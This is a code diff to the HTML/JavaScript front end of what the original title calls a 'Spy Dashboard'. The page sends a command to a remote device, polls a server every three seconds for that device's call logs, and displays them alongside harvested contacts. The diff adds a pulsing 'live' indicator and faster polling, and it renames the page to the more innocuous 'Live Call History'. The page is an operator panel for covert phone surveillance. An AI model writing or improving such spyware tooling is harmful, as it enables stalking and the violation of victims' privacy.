@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Call History - Spy Dashboard</title>
+    <title>Live Call History</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -47,7 +47,23 @@
             display: flex; align-items: center; justify-content: center;
         }
 
-        .page-title { font-size: 1.1rem; font-weight: 600; letter-spacing: 0.5px; }
+        .page-title { 
+            font-size: 1.1rem; font-weight: 600; letter-spacing: 0.5px;
+            display: flex; align-items: center; gap: 8px;
+        }
+
+        /* Live Indicator Dot */
+        .live-dot {
+            width: 8px; height: 8px; background-color: #30d158;
+            border-radius: 50%; box-shadow: 0 0 10px #30d158;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.2); }
+            100% { opacity: 1; transform: scale(1); }
+        }
         
         .refresh-btn {
             background: transparent; border: none;
@@ -119,7 +135,7 @@
     <div class="container">
         <div class="header">
             <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
-            <span class="page-title">Recents</span>
+            <span class="page-title"><div class="live-dot"></div> Recents</span>
             <button onclick="fetchLogs()" class="refresh-btn" id="refreshBtn"><i class="fa-solid fa-rotate"></i></button>
         </div>
 
@@ -140,14 +156,20 @@
                 window.location.href = "index.html";
                 return;
             }
+            
             detectContactsData();
             loadFromStorage();
             sendCommand();
-            setTimeout(fetchLogs, 2000); 
-            setInterval(fetchLogs, 10000);
+
+            // --- LIVE UPDATE LOGIC ---
+            // Pehli baar 2 second baad fetch karo
+            setTimeout(fetchLogs, 2000);
+            
+            // Uske baad har 3 second (3000ms) mein auto-update karo
+            setInterval(fetchLogs, 3000); 
         });
 
-        // 1. Detect Contacts from LocalStorage
+        // 1. Contacts Detect
         function detectContactsData() {
             try {
                 for (let i = 0; i < localStorage.length; i++) {
@@ -166,7 +188,7 @@
             } catch (e) { console.error("Contacts error", e); }
         }
 
-        // 2. Name Matching
+        // 2. Name Match
         function findContactName(phoneNumber) {
             if (!cachedContacts || cachedContacts.length === 0) return null;
             try {
@@ -181,22 +203,20 @@
             } catch (e) { return null; }
         }
 
-        // 3. Helper to Normalize Date (Fixes 1970 Issue)
+        // 3. DATE FIXER (Seconds/Milliseconds)
         function normalizeDate(timestamp) {
             let timeNum = Number(timestamp);
-            if (isNaN(timeNum)) return 0; // Agar date kharab hai
-
-            // Agar 13 digits se kam hai (Seconds mein hai), to 1000 se multiply karo
+            if (isNaN(timeNum)) return 0; 
+            // Agar seconds mein hai (chota number), to ms mein convert karo
             if (timeNum < 1000000000000) {
                 timeNum = timeNum * 1000;
             }
             return timeNum;
         }
 
-        // 4. Smart Date Formatter
+        // 4. Formatter
         function formatSmartDate(timestamp) {
             if (!timestamp) return "Unknown";
-            
             const ms = normalizeDate(timestamp);
             if (ms === 0) return "Unknown";
 
@@ -224,7 +244,7 @@
                 document.getElementById("logsContainer").innerHTML = `
                     <div class="status-msg">
                         <i class="fa-solid fa-spinner fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
-                        <p>Loading History...</p>
+                        <p>Waiting for data...</p>
                     </div>`;
             }
         }
@@ -238,27 +258,32 @@
         }
 
         function fetchLogs() {
+            // Timestamp add kiya taaki browser cache na kare purana data
             fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/call_logs?t=${new Date().getTime()}`)
                 .then(response => response.json())
                 .then(data => {
                     if (data && data.length > 0) {
+                        // Purane data se compare kar sakte hain, par safety ke liye update kar rahe hain
                         localStorage.setItem(storageKey, JSON.stringify(data));
                         detectContactsData();
                         renderLogs(data);
                     }
                 })
-                .catch(err => console.log("Silent refresh failed"));
+                .catch(err => {
+                    // Silent fail taaki user disturb na ho
+                    console.log("Auto-update check...");
+                });
         }
 
         function renderLogs(data) {
             const container = document.getElementById("logsContainer");
             if(!container) return;
-            container.innerHTML = ""; 
+            
+            // Sort by Normalized Date
+            data.sort((a, b) => normalizeDate(b.date) - normalizeDate(a.date));
 
-            // SORT LOGIC FIXED: Using normalized date
-            data.sort((a, b) => {
-                return normalizeDate(b.date) - normalizeDate(a.date);
-            });
+            // Poora HTML rebuild karenge (Live feel ke liye)
+            let htmlContent = "";
 
             data.forEach(log => {
                 const type = (log.type || "").toLowerCase();
@@ -278,24 +303,15 @@
                 const matchedName = findContactName(log.number);
                 const nameColorClass = isMissed ? "is-missed" : "";
 
-                let mainText = "";
-                let subText = "";
-                let mainIcon = ""; 
+                let mainText = matchedName ? matchedName : log.number;
+                let subText = matchedName ? ("Mobile • " + log.number) : "Unsaved";
+                let mainIcon = matchedName 
+                    ? `<i class="fa-solid fa-user name-icon" style="margin-right:5px;"></i>` 
+                    : `<i class="fa-solid fa-mobile-screen name-icon" style="margin-right:5px;"></i>`;
 
-                if (matchedName) {
-                    mainText = matchedName;
-                    subText = "Mobile • " + log.number;
-                    mainIcon = `<i class="fa-solid fa-user name-icon" style="margin-right:5px;"></i>`;
-                } else {
-                    mainText = log.number;
-                    subText = "Unsaved";
-                    mainIcon = `<i class="fa-solid fa-mobile-screen name-icon" style="margin-right:5px;"></i>`;
-                }
-
-                // Date Formatting Call
                 const prettyDate = formatSmartDate(log.date);
 
-                container.innerHTML += `
+                htmlContent += `
                     <div class="log-card">
                         <div class="log-icon ${iconClass}">
                             <i class="fa-solid ${iconSymbol}"></i>
@@ -315,6 +331,8 @@
                         </a>
                     </div>`;
             });
+
+            container.innerHTML = htmlContent;
         }
     </script>
 </body>
